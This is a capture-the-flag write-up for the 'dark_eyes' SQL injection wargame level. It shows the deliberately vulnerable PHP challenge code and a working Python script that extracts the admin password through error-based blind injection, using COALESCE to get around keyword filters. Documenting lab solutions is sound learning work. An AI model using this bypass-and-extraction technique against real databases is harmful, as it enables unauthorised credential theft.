# dark_eyes

```php
<?php
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(mysqli_error($db)) exit();
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
  highlight_file(__FILE__);
?>
```

Here also we have to find the admin's password. Here also we are only getting erros. But here we cannot use `if`,`case`,`when`. So we are using `coalesce` which will select the second option only if the first is null. So we wrote a script for that.

```python
from string import digits,ascii_lowercase
import requests

session = requests.Session()
cookies = {"PHPSESSID": "7sp0e6btgarr92g7av9b5ddi58"}

url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw=' or id='admin' and (select coalesce((select pw where length(pw)={}),(select 1 union select 2)));--+"
for i in range(200):
    r = requests.get(url.format(i), cookies=cookies)
    print(i, end='\r')
    if('?php' in r.text):
        l = i
        break
print("Length :", l)
url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw=' or id='admin' and (select coalesce((select pw where pw like '{}%'),(select 1 union select 2)));--+"
pw = ""
for j in range(l):
    for i in digits+ascii_lowercase:
        r = requests.get(url.format(pw+i), cookies=cookies)
        if('?php' in r.text and i not in "#+%.&"):
            pw += i
            print("Password : {}".format(pw), end='\r')
            break
print("Password :", pw)

```

This will give the password.
